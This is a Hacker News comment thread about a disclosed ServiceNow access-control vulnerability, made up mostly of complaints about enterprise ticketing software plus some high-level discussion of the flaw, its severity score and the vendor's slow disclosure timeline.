=== Content from news.ycombinator.com_b3a8ad90_20250115_095837.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D36638530) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [ServiceNow Insecure Access Control to Full Admin Takeover](https://x64.sh/posts/ServiceNow-Insecure-access-control-to-admin/) ([x64.sh](from?site=x64.sh)) | | --- | --- | --- | |  | | 171 points by [muscaw](user?id=muscaw) [on July 7, 2023](item?id=36638530)  | [hide](hide?id=36638530&goto=item%3Fid%3D36638530) | [past](https://hn.algolia.com/?query=ServiceNow%20Insecure%20Access%20Control%20to%20Full%20Admin%20Takeover&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=36638530&auth=3ccc2b0eac56037e5604582f18cb04b1f098cb97) | [76 comments](item?id=36638530) |  | |  |  | [chevman](user?id=chevman) [on July 7, 2023](item?id=36638908)   | [next](#36641286) [–]  Of all the shitty enterprise software vendors, there is no platform I hate more than ServiceNow. What an abomination of something seemingly so simple made into something so horrendously complex and bloated. I was trying to explain to some new ServiceNow AE why we wouldn't be buying more product from them. Literally everyone who uses the product hates it - developers, admins, end users. It behaves like it is constantly broken. People talk shit about it all day, every day. Maybe one day, some time a long time ago they had a good product, and that's how it got embedded all over the place, but now, what a pile of junk! | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [solresol](user?id=solresol) [on July 7, 2023](item?id=36639676)   | [parent](#36638908) | [next](#36639076) [–]  You should have seen the platform it replaced. ServiceNow was essentially "let's rewrite HP Service Manager from scratch to remove the legacy debt." Service Manager was what you get when you develop a mainframe green screen application using a low-code RAD system and then try to maintain it for 20 years. Amusingly, I'm consulting with a company now whose business model and product strategy is "a rewrite of Service Manager that's cheaper and more sane." Presumably the cycle of rewriting these kinds of platforms will continue until the heat death of the universe. | | --- | --- | --- | | | |  |  | [mongol](user?id=mongol) [on July 8, 2023](item?id=36640340)   | [root](#36638908) | [parent](#36639676) | [next](#36639076) [–]  I recall that once upon a time, Service Manager was a client side app using the same GUI framework as Eclipse. Which made it very heavy, using tons of memory for an app that you only used now and then. I am not completely sure it was Service Manager, but quite sure. Then it was made a web app, 15+ years or so ago. Compared to that, ServiceNow is a dream to use. | | --- | --- | --- | | | |  |  | [Spooky23](user?id=Spooky23) [on July 8, 2023](item?id=36641219)   | [root](#36638908) | [parent](#36640340) | [next](#36639076) [–]  The young pups here whining about ServiceNow have no idea. Service Manager, Remedy, etc were exponentially more miserable. I worked at a place that had 6 people who just twiddled Service Manager and kept the servers running etc. All ticketing systems suck. It’s the nature of the beast. People used to talk about how awesome JIRA is. Lol. | | --- | --- | --- | | | |  |  | [kayodelycaon](user?id=kayodelycaon) [on July 8, 2023](item?id=36643593)   | [root](#36638908) | [parent](#36641219) | [next](#36639076) [–]  Personally, I think JIRA is awesome. I’ve seen the absolute disaster that is enterprise software and the cloud version of JIRA is not a disaster. Everyone hates ticketing systems. But I think that’s because people hate spending time on things that aren’t relevant to them. They all get in the way of someone’s desired workflow. (Did I, a champion of organization, fill out my time sheet? No. No I did not. *grumbles*) JIRA’s strength is being mediocre for just about everyone. No one’s workflow can be implemented 100%, but it can be customized enough for most purposes. | | --- | --- | --- | | | |  |  | [mlloyd](user?id=mlloyd) [on July 11, 2023](item?id=36687034)   | [root](#36638908) | [parent](#36643593) | [next](#36639076) [–]  "JIRA’s strength is being" amazing for enterprise development teams and mediocre for everyone else. | | --- | --- | --- | | | |  |  | [version\_five](user?id=version_five) [on July 7, 2023](item?id=36639076)   | [parent](#36638908) | [prev](#36639676) | [next](#36643524) [–]  I think all that generally applies to enterprise software like that, no? SAP is absolute garbage but it ticks various C-level agenda items (mainly the act itself of investing in ERP modernization) and so it sells regardless. Servicenow I belive makes it harder for employees to get help and thus saves labor. Enterprise software isn't for you or me, that's why we hate it. | | --- | --- | --- | | | |  |  | [procflora](user?id=procflora) [on July 8, 2023](item?id=36640503)   | [root](#36638908) | [parent](#36639076) | [next](#36643524) [–]  Definitely feels like SAP is in the "nobody gets fired for buying it" category too, at least in my little slice of industry. | | --- | --- | --- | | | |  |  | [INTPenis](user?id=INTPenis) [on July 8, 2023](item?id=36643524)   | [parent](#36638908) | [prev](#36639076) | [next](#36639509) [–]  I couldn't agree more. But as others have said, it did replace some awful late 90s, early 2000s, software. What's funny is that my dayjob became a re-seller for ServiceNow, and our ServiceNow install is terribly slow. Then we have a major government client that we tried to sell ServiceNow to, but they decided on another re-seller. And I still have to work with this client as a consultant so I have to login to their separate ServiceNow setup, and wow is it faster! That other vendor that won the contract over us sure did a much better job at the setup than we ever did. (I was not involved in the re-selling or setup of ServiceNow at my dayjob, I only work in it as a user) | | --- | --- | --- | | | |  |  | [TheNewsIsHere](user?id=TheNewsIsHere) [on July 9, 2023](item?id=36650198)   | [root](#36638908) | [parent](#36643524) | [next](#36639509) [–]  One of ServiceNow’s biggest mistakes and greatest strengths is how much freedom it provides admins and devs to absolutely grind the instance to a halt. Every shitty or slow ServiceNow instance I have seen in recent memory is because the customer is slugging along horrible code and poorly designed LCNC apps. A well managed instance can fly. Not that the platform doesn’t have its problems of course. But most people’s experience with it is as the victim/end user of awful implementations. My university used a resold white label instance from a consultant and that thing was an absolute disaster. | | --- | --- | --- | | | |  |  | [maximinus\_thrax](user?id=maximinus_thrax) [on July 7, 2023](item?id=36639509)   | [parent](#36638908) | [prev](#36643524) | [next](#36639761) [–]  > People talk shit about it all day, every day. In my two-decade long career, I don't think I ever heard about any enterprise software for which that statement is false. | | --- | --- | --- | | | |  |  | [Aeolun](user?id=Aeolun) [on July 8, 2023](item?id=36640184)   | [root](#36638908) | [parent](#36639509) | [next](#36639761) [–]  We use Slack, which is pretty decent. We also use Github, which has been historically great. There’s Bulas, which is a timekeeping application developed somewhere in 1995 (I think) that’s just server rendered HTML and is a joy to use (especially compared to the other piles of crap). | | --- | --- | --- | | | |  |  | [notyourwork](user?id=notyourwork) [on July 7, 2023](item?id=36639761)   | [parent](#36638908) | [prev](#36639509) | [next](#36641127) [–]  I think you have a skewed perception of value add. ServiceNow conquered the software as a service industry like no other and will be around for decades to come. Developers and Admins may not like it because its development with bumpers for kids. End users dislike it because of the developers and admins. There may be some worth looking in the mirror to be had before you point the finger at a software platform for short comings within the organization. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [on July 8, 2023](item?id=36640430)   | [root](#36638908) | [parent](#36639761) | [next](#36640157) [–]  > Developers and Admins may not like it because its development with bumpers for kids. End users dislike it because of the developers and admins. What about not liking it because they have a bad data model with insufficient validation leading to silent data loss and various cases where you can create a record you don’t have permission to use? Or not having decent full-text search in 2023? Or needing ~10-15MB of JavaScript to simply load? I agree that enterprise IT departments make it worse but it wasn’t like it was starting from a position of good unless you recently emerged from cryosleep and haven’t updated your views on software engineering since 1993. | | --- | --- | --- | | | |  |  | [Aeolun](user?id=Aeolun) [on July 8, 2023](item?id=36640157)   | [root](#36638908) | [parent](#36639761) | [prev](#36640430) | [next](#36640006) [–]  There must be some other platform that’s better than servicenow that does the same thing. I find it hard to believe this grotesque abomination is the state of the art in IT management. | | --- | --- | --- | | | |  |  | [eropple](user?id=eropple) [on July 8, 2023](item?id=36640808)   | [root](#36638908) | [parent](#36640157) | [next](#36640831) [–]  There surely are. They don't, however, have the name recognition, the comparative availability of people who know how to deal with it, the ecosystem of vendors to sell you extensions, or, yeah, the sales function to push it at larger companies. ServiceNow is big because everybody involved is incentivized to help make it big. And FWIW, at my very very large company, it isn't even in the top 5 of shitty systems I have to deal with. ServiceNow at least *works*. | | --- | --- | --- | | | |  |  | [mc32](user?id=mc32) [on July 8, 2023](item?id=36640831)   | [root](#36638908) | [parent](#36640157) | [prev](#36640808) | [next](#36640006) [–]  No, there isn’t. They all have pros and cons but none overall are “better”. ServiceNow is for large orgs with independent departments/orgs who need to use it differently. There’s BMC/Remedy but it’s just as convoluted and worse. Also Clarity used to be there. There are many that are better at one one or two specific functions, sure. But none that have all the added features a large mature org would need. | | --- | --- | --- | | | |  |  | [notyourwork](user?id=notyourwork) [on July 8, 2023](item?id=36641010)   | [root](#36638908) | [parent](#36640831) | [next](#36640006) [–]  Comparing remedy and ServiceNow is a bit like comparing cable television with Netflix. | | --- | --- | --- | | | |  |  | [DropInIn](user?id=DropInIn) [on July 9, 2023](item?id=36656191)   | [root](#36638908) | [parent](#36641010) | [next](#36640006) [–]  So an improvement? | | --- | --- | --- | | | |  |  | [yoyoyo1122](user?id=yoyoyo1122) [on July 8, 2023](item?id=36640006)   | [root](#36638908) | [parent](#36639761) | [prev](#36640157) | [next](#36641127) [–]  > Developers and Admins may not like it because its development with bumpers for kids. End users dislike it because of the developers and admins. As a current ServiceNow developer for a F500 company, this is so true. Developing is frustrating since they strive for low/no code. They only started allowing ECMA6 like last year and it's still extremely limited. | | --- | --- | --- | | | |  |  | [runlevel1](user?id=runlevel1) [on July 8, 2023](item?id=36641127)   | [parent](#36638908) | [prev](#36639761) | [next](#36639204) [–]  Enterprises want software that they can bend to conform to their entrenched, arcane business processes. But no two enterprises are alike. And meeting the needs of the lowest common denominator doesn't sell units. So you risk falling into the trap of trying to do everything for everyone but doing nothing well. You can only stuff so much shit into a cornucopia before it becomes more of a garbage bin. | | --- | --- | --- | | | |  |  | [wintogreen74](user?id=wintogreen74) [on July 7, 2023](item?id=36639204)   | [parent](#36638908) | [prev](#36641127) | [next](#36641856) [–]  >> Of all the shitty enterprise software vendors, there is no platform I hate more than ServiceNow. Forget about their enterprise software, the very premise of the function they support is the thing I hate most. The software, the company, the consultants who push this garbage, the employees within your company who somehow have a named role implementing and managing it, I loathe it all. | | --- | --- | --- | | | |  |  | [NikolaNovak](user?id=NikolaNovak) [on July 8, 2023](item?id=36639929)   | [root](#36638908) | [parent](#36639204) | [next](#36641856) [–]  interesting; curious - What *is* the thing you hate the most here? FWIW, I've been a kind of sysadmins for couple of decades, then ops manager for 5. After supporting multiple production streams, good and organized and consistent processes are an absolute must for me (as opposed to random wild west and utter chaos sometimes we techie prefer :-)). It is my understanding "premise of function they support" is organized work flows - standard and "let's not reinvent the wheel badly" ways to manage and report on incidents, service requests, etc. And hopefully do some trends and reporting and categories and whatnots. So I don't know if service now does that well or poorly... But what in there do you "loathe"?? It may not be your cup of tea and you'd rather develop freely, and fair enough, but somebody somewhere has to support large productions and large numbers of users and need tools better than slack and emails to do it... :-/ | | --- | --- | --- | | | |  |  | [sublinear](user?id=sublinear) [on July 8, 2023](item?id=36640979)   | [root](#36638908) | [parent](#36639929) | [next](#36646045) [–]  My guess is they underestimate the scale at which it's used in most businesses who do and the relative unimportance of the accuracy of the data it holds. It's never going to perfectly capture all details of work because of its inflexibility, but it's better than nothing or not even trying. As long as everyone understands that and nobody is delusionally running around with a trusty clipboard and a whip or rallying for significant change based on it without consulting the people actually entering the data, it's alright. There's a lot to keep track of. Definitely not my cup of tea either, but it is what it is. | | --- | --- | --- | | | |  |  | [gibbitz](user?id=gibbitz) [on July 8, 2023](item?id=36646045)   | [root](#36638908) | [parent](#36639929) | [prev](#36640979) | [next](#36641856) [–]  The UI UX is hands-down the worst part. When a serious incident is opened and assigned to a team member the most efficient way to work it is to share around the link from the notification email as it can take more than 20 minutes to find it without a unique ID of the task or the assignee. The UI is full of unused links in my organization's implementation which makes this even more difficult as there is no hierarchy based on common or high use tasks. My favorite gripe is when resolving a task or incident the required notes for resolution are hidden under a tab somewhere in the middle of the page. Due to the counter-intuitive UI my team is often breaking process just to appease the SNOW workflow which in my organization leads to more tickets... | | --- | --- | --- | | | |  |  | [albert\_e](user?id=albert_e) [on July 8, 2023](item?id=36641856)   | [parent](#36638908) | [prev](#36639204) | [next](#36639012) [–]  I agree with other veterans? here. ServiceNow was the better alternative all round -- as compared to Remedy and HP Service Center. The customizations and integrations, api, cloud were decent. The licensing was bad. The pressure to "upgrade" to latest version every year (or lose support) was insane. Sales was aggressive. A couple of trends probably pushed this into a hated category -- Orgs had to customize the hell out of every workflow instead of keeping it simple and following standard ITIL. The moment you veered away from "out of the box" features and did customizations ..your yearly upgrades risked failing. The people in Orgs who maintain and customize the tool needed to be decently skilled. Cheapest body shop vendor doesn't cut it. ServiceNow certifications were good initially then they became expensive/unaffordable, too many, too much to keep current. ServiceNow themselves brought into many new features like AI, chatbots, RPA etc that it all became a huge complex beast. Basic features of a ticketing tool probably became too complex to maintain? | | --- | --- | --- | | | |  |  | [clivestaples](user?id=clivestaples) [on July 7, 2023](item?id=36639012)   | [parent](#36638908) | [prev](#36641856) | [next](#36640543) [–]  I worked there for exactly two months. After 15 days, I could not receive another offer and put in my notice fast enough. Ended up giving them four days. And I'm usually very careful about not burning bridges. | | --- | --- | --- | | | |  |  | [bgm1975](user?id=bgm1975) [on July 7, 2023](item?id=36639725)   | [root](#36638908) | [parent](#36639012) | [next](#36640493) [–]  Can you elaborate more about what you saw/experienced there? | | --- | --- | --- | | | |  |  | [dimmke](user?id=dimmke) [on July 8, 2023](item?id=36640493)   | [root](#36638908) | [parent](#36639012) | [prev](#36639725) | [next](#36640543) [–]  I feel like if you’ve worked at a place for less than. 2 months, there really shouldn’t be any obligation to give two weeks notice. Unless it’s a tiny company and you were hired as like their staff engineer or something. The chance you’re actually on something that matters instead of ramping up is very low. | | --- | --- | --- | | | |  |  | [jcims](user?id=jcims) [on July 8, 2023](item?id=36640543)   | [parent](#36638908) | [prev](#36639012) | [next](#36640868) [–]  Feels like they have to boot a VM every time you click something. Their cloud CMDB offerings are horrendous, and in my experience get bought before anyone gets a chance to let the blood out. | | --- | --- | --- | | | |  |  | [wharfjumper](user?id=wharfjumper) [on July 8, 2023](item?id=36640868)   | [parent](#36638908) | [prev](#36640543) | [next](#36640806) [–]  Can you elaborate? A customer is in the process of implementing (Tokyo version?) it and it seems to have an intuitive, responsive UI. I'm judging it against Atlassian and Oracle EBS so I have low expectations. | | --- | --- | --- | | | |  |  | [brazzledazzle](user?id=brazzledazzle) [on July 8, 2023](item?id=36641162)   | [root](#36638908) | [parent](#36640868) | [next](#36641231) [–]  I don’t know what version I used to use but I wouldn’t have called the UI intuitive or responsive. It was randomly buggy from a workflow perspective too. Like resources getting stuck in a weird limbo. Conditions would be met but not visible by the condition evaluator. Or queries failing to find anything but later work. It could be somewhat awful at times but I don’t think it was as terrible as Remedy... but what is? | | --- | --- | --- | | | |  |  | [Spooky23](user?id=Spooky23) [on July 8, 2023](item?id=36641231)   | [root](#36638908) | [parent](#36640868) | [prev](#36641162) | [next](#36640806) [–]  Customers make stupid customizations that break it. Especially older implementations. Also help desk is the first use case, nobody wants to give the helpless level 1 people any changes, as it’s an excuse not to perform. | | --- | --- | --- | | | |  |  | [zorrobyte](user?id=zorrobyte) [on July 8, 2023](item?id=36640806)   | [parent](#36638908) | [prev](#36640868) | [next](#36639048) [–]  I was at IBM for several years, can agree that ServiceNow is a steaming pile, like most of IBM. I spent the majority of my time fighting tooling over actually helping customers, lol. | | --- | --- | --- | | | |  |  | [NikolaNovak](user?id=NikolaNovak) [on July 7, 2023](item?id=36639048)   | [parent](#36638908) | [prev](#36640806) | [next](#36639448) [–]  What makes it so bad? We are likely to get it next year . I feel it cannot be worse than the aberration we are currently using but I could be wrong :-/ | | --- | --- | --- | | | |  |  | [genmud](user?id=genmud) [on July 7, 2023](item?id=36639477)   | [root](#36638908) | [parent](#36639048) | [next](#36639536) [–]  You could be wrong... I worked at a place where we had like 20-30 different ERPs and they got SAP as a way to centralize the entire thing on one platform. However, during the migration they managed to recreate interfaces that resembled the old workflows people were used to, effectively having 20-30 customized SAP UIs with a common backend. It became such a clusterfuck the vendor (SAP) who we paid *MASSIVE* amounts of money to, wouldn't support their own software. Thanks for coming to my TED talk, try to run as vanilla as possible. | | --- | --- | --- | | | |  |  | [calvinmorrison](user?id=calvinmorrison) [on July 8, 2023](item?id=36640685)   | [root](#36638908) | [parent](#36639477) | [next](#36641225) [–]  I have this quote bookmarked, about ERPS: "Most companies spend way too much time and money trying to make software work for their processes. Some of these processes haven't changed in years or even decades. Rather than customizing software to work for your processes, it's often easier to reevaluate processes around modern software." You can have your ERP customized, but you cannot have your cake and eat it (without cost). Ramping up new trading partners, onboarding new staff, whatever it is. One reason accounting people have it easier than us tech people is they've got a very good clear process. It's rare that anyone mucks with Accounts Payable / Accounts Receivable / Payroll. So yeah, go on pretending your SMB that manufactures/ships/resells/distributes product/service \_\_\_\_\_\_\_\_\_ is unique and needs your own processes, it \_will\_ bite you in the butt. | | --- | --- | --- | | | |  |  | [Sylamore](user?id=Sylamore) [on July 8, 2023](item?id=36641225)   | [root](#36638908) | [parent](#36639477) | [prev](#36640685) | [next](#36639891) [–]  >try to run as vanilla as possible. I can't emphatically agree with this enough. I've worked on a Siebel 7.5 installation that was so heavily customized by a certain DBS TV company that it's still running to this day because upgrading to a current release means starting over from scratch. There are efforts underway to migrate it to SalesForce but that's been in progress for 3 years and still not far enough along to cut over. | | --- | --- | --- | | | |  |  | [NikolaNovak](user?id=NikolaNovak) [on July 8, 2023](item?id=36639891)   | [root](#36638908) | [parent](#36639477) | [prev](#36641225) | [next](#36639536) [–]  Thanks, appreciate the perspective. But I've been implementing peoplesoft for, dear god, quarter of a century now, so I'm familiar with that unfortunate pattern. I guess I'm more wondering is service now inherently so bad it's unsalvageable, or is it a matter of good vs bad implementation, and resulting business transformation (or lack thereof :). | | --- | --- | --- | | | |  |  | [Aeolun](user?id=Aeolun) [on July 8, 2023](item?id=36640212)   | [root](#36638908) | [parent](#36639891) | [next](#36639536) [–]  It’s like, navigating through servicenow immediately tells you that the people that build it were used to doing RPC, and didn’t quite understand how HTTP or HTML worked. It goes downhill from there. I think at some point they decided to hire a few frontend engineers to do some form of SPA, but now it’s so badly integrated that… Jank! Jank everywhere! | | --- | --- | --- | | | |  |  | [inferiorhuman](user?id=inferiorhuman) [on July 7, 2023](item?id=36639536)   | [root](#36638908) | [parent](#36639048) | [prev](#36639477) | [next](#36639099) [–]  We used it locally at megacorp in place of the standard JIRA instance. As an end user I disliked it because it was painfully slow and the interface was awful. It broke browser navigation, if there were permalinks they were nearly impossible to find so most things couldn't easily be bookmarked, filtering was tedious and unintuitive. Some coworkers tried to write CLI tools and the API turned out to be as awkward as the web UI. Ideally we would've just thrown more money at CloudBees, but there was no political will to fight for another paid JIRA instance. I'm sure there are worse tools than snow but I'd just as soon never use it again. | | --- | --- | --- | | | |  |  | [vxNsr](user?id=vxNsr) [on July 7, 2023](item?id=36639099)   | [root](#36638908) | [parent](#36639048) | [prev](#36639536) | [next](#36641311) [–]  It’s secret super power for executives is GQL it’s easier to use vs SQL and the interface looks slick compared to what’s out there. A very well architected instance looks and is pretty good, the issue is that often large enterprises will hire the cheapest possible consulting firm to implement it, and you can really screw it up if you’re not careful. | | --- | --- | --- | | | |  |  | [NikolaNovak](user?id=NikolaNovak) [on July 7, 2023](item?id=36639126)   | [root](#36638908) | [parent](#36639099) | [next](#36639775) [–]  My background is ERP so that sounds similar then - the bones may be decent, but how you implement it can make or break it, both as IT exercise and as business transformation / process implementation; is that About right? I will likely have *some* input on how it's implemented and particularly the processes. I guess I should start reading up on best practices etc... | | --- | --- | --- | | | |  |  | [Karrot\_Kream](user?id=Karrot_Kream) [on July 7, 2023](item?id=36639579)   | [root](#36638908) | [parent](#36639126) | [next](#36651069) [–]  This seems to be the big problem with ERPs. Problem domains are complex so you need implementation flexibility, but with that comes the ability to create shitty systems that everyone hates. | | --- | --- | --- | | | |  |  | [vxNsr](user?id=vxNsr) [on July 9, 2023](item?id=36651069)   | [root](#36638908) | [parent](#36639126) | [prev](#36639579) | [next](#36639775) [–]  Yes, servicenow is much closer to an opinionated ERP vs a simple ITSM platform. In fact they’re working pretty hard on making it easier to implement your own erp type process in snow, instead of using it for only your item needs. | | --- | --- | --- | | | |  |  | [notyourwork](user?id=notyourwork) [on July 7, 2023](item?id=36639775)   | [root](#36638908) | [parent](#36639099) | [prev](#36639126) | [next](#36641311) [–]  100% this - I used to do enterprise integrations in the early days of ServiceNow. It's not a bad platform, consulting companies can suck (most do) and in-house implementations usually suck for different reasons. ServiceNow is a combination of data modeling, interface and process design along with carefully balancing how to do things. Most of my time was in the CMS and SOAP integrations. | | --- | --- | --- | | | |  |  | [cjmcqueen](user?id=cjmcqueen) [on July 8, 2023](item?id=36641311)   | [root](#36638908) | [parent](#36639048) | [prev](#36639099) | [next](#36641089) [–]  Many places to start, but I would say SN lacks a strong engineering culture, so everything is driven by sales and profit. That means updates come every 6 months with "features" that will never get proper support. It's shiny thing stacked on top of shiny thing and it's just a mess | | --- | --- | --- | | | |  |  | [kneebonian](user?id=kneebonian) [on July 8, 2023](item?id=36641089)   | [root](#36638908) | [parent](#36639048) | [prev](#36641311) | [next](#36639448) [–]  The best answer I can give you is that if you guys get it fully implemented next year you'll be able to have the first screen load, and if you're lucky run a query to completion the year after that. Not because you need to implement anything, or configuration reasons. That's just how long it takes to do basic things. | | --- | --- | --- | | | |  |  | [closeparen](user?id=closeparen) [on July 7, 2023](item?id=36639448)   | [parent](#36638908) | [prev](#36639048) | [next](#36639182) [–]  Something I've been mulling over for a while: security vulnerabilities are basically the original developers getting outsmarted, caught out being careless. Even a very skilled, careful team *might* ship bugs that have security implications. But low-skilled, careless teams are definitely doing this. All buggy software is also vulnerable. There is no such thing as low-quality but secure. | | --- | --- | --- | | | |  |  | [parl\_match](user?id=parl_match) [on July 8, 2023](item?id=36642213)   | [root](#36638908) | [parent](#36639448) | [next](#36639182) [–]  > security vulnerabilities are basically the original developers getting outsmarted, caught out being careless This is absolutely not true. Security vulnerabilities can be due to a huge variety of reasons well beyond "the developer is outsmarted/careless". A great example of this was unicode related issues. Also, changing API/ABI surfaces. And, we think of security vulnerabilities as "bugs" that cause "hacks", but sometimes vulnerabilities come in the form not in a technical hack, but attacks on users. Sometimes, the developers know there's an issue, but the business forces them ahead anyways and takes on the risk. I've dealt with a few of those. It's counterproductive to put it firmly on the developers, but I do agree that technical security issues and quality issues are tightly intertwined. | | --- | --- | --- | | | |  |  | [robertlagrant](user?id=robertlagrant) [on July 7, 2023](item?id=36639182)   | [parent](#36638908) | [prev](#36639448) | [next](#36640199) [–]  When it started it was the great hope vs the incumbents. I never used it, but it used to be very well thought of. | | --- | --- | --- | | | |  |  | [miguelazo](user?id=miguelazo) [on July 8, 2023](item?id=36640199)   | [parent](#36638908) | [prev](#36639182) | [next](#36639732) [–]  Replace ServiceNow with Adobe and you've got a real villain. There are *far* worse products in the same space than ServiceNow. Edit: glad to see someone else already mentioned SAP. | | --- | --- | --- | | | |  |  | [SteveNuts](user?id=SteveNuts) [on July 7, 2023](item?id=36639732)   | [parent](#36638908) | [prev](#36640199) | [next](#36653604) [–]  Have you ever heard of Cherwell? | | --- | --- | --- | | | |  |  | [binarysneaker](user?id=binarysneaker) [on July 8, 2023](item?id=36640433)   | [root](#36638908) | [parent](#36639732) | [next](#36653604) [–]  *shivers* | | --- | --- | --- | | | |  |  | [aiisjustanif](user?id=aiisjustanif) [on July 9, 2023](item?id=36653604)   | [parent](#36638908) | [prev](#36639732) | [next](#36641042) [–]  You should try out Cherwell, it’s so bad it’ll make you love ServiceNow. | | --- | --- | --- | | | |  |  | [JimmyRuska](user?id=JimmyRuska) [on July 8, 2023](item?id=36641042)   | [parent](#36638908) | [prev](#36653604) | [next](#36642038) [–]  The stock trades like some crypto alt coin from the promised land | | --- | --- | --- | | | |  |  | [ChatGTP](user?id=ChatGTP) [on July 8, 2023](item?id=36642038)   | [parent](#36638908) | [prev](#36641042) | [next](#36641286) [–]  Have you seen their share price though ? Boom. | | --- | --- | --- | | | |  |  | [rzimmerman](user?id=rzimmerman) [on July 8, 2023](item?id=36641286)   | [prev](#36638908) | [next](#36638838) [–]  Summary from what I read: Any user can query pretty much any table in the DB using their "GQL" wrapper around SQL. Someone thought enough to restrict the "user\_password" field, so instead you query another table which gives you the user's session ID. Normally a token is user session ID + signature. But it turns out the signature wasn't really being validated, so user session ID + anything worked. I'm normally not one to jump on mistakes, but that's remarkably bad. | | --- | --- | --- | | | |  |  | [frakt0x90](user?id=frakt0x90) [on July 7, 2023](item?id=36638838)   | [prev](#36641286) | [next](#36639540) [–]  Almost exactly a year from report to disclosure. I'm sure it varies a lot, but is that a normal timeline for something this severe? | | --- | --- | --- | | | |  |  | [6D794163636F756](user?id=6D794163636F756) [on July 7, 2023](item?id=36638966)   | [parent](#36638838) | [next](#36640198) [–]  It can really depend on the nature of the vulnerability and who discovered it. Based on the timeline at the bottom of this article it seems like this was way too slow. Based on the cve information this was ranked as 9.8. The last time I dealt with a bug that bad it was log4j. It was found on a Tuesday, patched on a Thursday, announced on a Friday, and I redeployed all of our servers over the weekend. The most egregious part in my eyes is the slow response to the initial contact. In shows that Service Now does not monitor it's reporting and that they don't care about security. If I were using a product of theirs to handle proprietary or privileged information I would no longer trust them. | | --- | --- | --- | | | |  |  | [cyrnel](user?id=cyrnel) [on July 8, 2023](item?id=36640917)   | [root](#36638838) | [parent](#36638966) | [next](#36640198) [–]  I suspect the CVSS score has been over-estimated. For the "scope" metric, the "vulnerable component" and the "affected component" are both ServiceNow itself, so that should be "unchanged": <https://security.stackexchange.com/a/129205> That drops you down to an 8.8. Also, log4shell was a 10.0, which got that extra .2 points from not requiring any privs, whereas this ServiceNow vuln requires "low" privs. | | --- | --- | --- | | | |  |  | [manvillej](user?id=manvillej) [on July 8, 2023](item?id=36645542)   | [root](#36638838) | [parent](#36640917) | [next](#36640198) [–]  Hi, ServiceNow dev here. I'd agree that the CVSS might be a little overinflated, but I don't think by much. I would argue that ServiceNow as a singular component is flawed. It could be several applications on a single instance: Vulnerability Response, Security Incident Response, IT Service Management, IT Operations management, Vendor Risk Management, CMDB, etc. I actually think in some instances, this vulnerability is considerably worse due the information it provides. User contact information, an inventory of the security vulnerabilities across the organization, applications & versions, Server information, etc. The social engineering issues are massive since they can spoof from essentially your service desk. Often times ServiceNow has access to other subsystems. Midservers, provisioning tools, monitoring systems, desktop orchestration tools. These systems are often used to handle the response & monitoring. The ServiceNow teams are often understaffed and underskilled. I've only been thinking about this for the last hour, but compromise 1 account (and I can think of at least 5 different ways that could happen) and a hacker could have: - a complete topology of your infrastructure - your active security vulnerabilities - contact information for your entire company - a very convincing spoofing method - the ability to remotely install software on customer desktops - the ability to monitor your response to security issues - access to your provisioning tools This kind of attack could go undetected for years. God forbid ServiceNow's internal instance got compromised. They can remote in to ANY instance. | | --- | --- | --- | | | |  |  | [technion](user?id=technion) [on July 8, 2023](item?id=36640198)   | [parent](#36638838) | [prev](#36638966) | [next](#36638882) [–]  My experience with this sort of enterprise software is that if you are a user, there is usually someone higher up the org chart than you that is worried such a disclosure will damage his relationship with his mate. My point being, much like Oracle, the usual timeline is that you never go public. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [on July 8, 2023](item?id=36640471)   | [root](#36638838) | [parent](#36640198) | [next](#36638882) [–]  Yes - I worked at a place which had that experience with them. Massive outage: down for weeks, data lost, etc. We paid millions for “support” and had very little to show for it. Things escalated, and their regional VP took our senior VP out to the corporate box to discuss it over football. Monday morning, word came out to stop talking about the problem where possible. A bunch of people worked nights & weekends to get it patched up but didn’t even get thanked by anyone above their immediate supervisor. | | --- | --- | --- | | | |  |  | [clintfred](user?id=clintfred) [on July 8, 2023](item?id=36641288)   | [root](#36638838) | [parent](#36640471) | [next](#36638882) [–]  That story makes me incredibly angry, and quite sad, actually. | | --- | --- | --- | | | |  |  | [stigz](user?id=stigz) [on July 7, 2023](item?id=36638882)   | [parent](#36638838) | [prev](#36640198) | [next](#36639486) [–]  No, judging from the Disclosure Timeline at the very bottom, it appears the lengthy remediation is due to ServiceNow dragging their feet. Took them over a month, plus a followup email, just to get them to respond to the initial report. | | --- | --- | --- | | | |  |  | [genmud](user?id=genmud) [on July 7, 2023](item?id=36639486)   | [parent](#36638838) | [prev](#36638882) | [next](#36641339) [–]  In any other software I would say no, but it's ServiceNow, so yes. | | --- | --- | --- | | | |  |  | [manvillej](user?id=manvillej) [on July 8, 2023](item?id=36641339)   | [parent](#36638838) | [prev](#36639486) | [next](#36639540) [–]  ServiceNow ships major upgrades twice a year and patches every month. It means that they could genuinely not figure out how to remediate this quickly and quietly without disrupting ongoing contract negotiations. It means that even with that, they couldn't fix it for a whole year. They negotiate multiyear contracts. they're investing into government and healthcare services. | | --- | --- | --- | | | |  |  | [manvillej](user?id=manvillej) [on July 10, 2023](item?id=36667681)   | [root](#36638838) | [parent](#36641339) | [next](#36639540) [–]  I have to correct myself. Apparently the vulnerability was patched in San Diego patch 7 which was release on September 1st 2022. It wasn't disclosed until June 2023. I am still mad they didn't release it as a hotfix, but that meant they couldn't sneak it under the radar. | | --- | --- | --- | | | |  |  | [pmlnr](user?id=pmlnr) [on July 7, 2023](item?id=36639540)   | [prev](#36638838) | [next](#36643419) [–]  Ah, ServiceNow. We had to hold a formal code review on the steaming pile of turd they delivered because it was so incredibly bad even testing it would have been a security risk. That's the quality you get from them. | | --- | --- | --- | | | |  |  | [mschuster91](user?id=mschuster91) [on July 8, 2023](item?id=36643419)   | [prev](#36639540) | [next](#36640902) [–]  And yet, it's leagues better than HP Service Manager or, heaven forbid, that ticket system someone created in Lotus Notes... Ticket systems are always a giant pain. | | --- | --- | --- | | | |  |  | [dvorak\_typist](user?id=dvorak_typist) [on July 8, 2023](item?id=36640902)   | [prev](#36643419) | [next](#36640205) [–]  InSecurityNow? Fuck'm with prejudice. Keep digging. RCE as admin has been a problem for over a decade. \_Globally\_ sessions do not expire... This is just the tip of the shit architecture iceberg. | | --- | --- | --- | | | |  |  | [pm2222](user?id=pm2222) [on July 8, 2023](item?id=36640205)   | 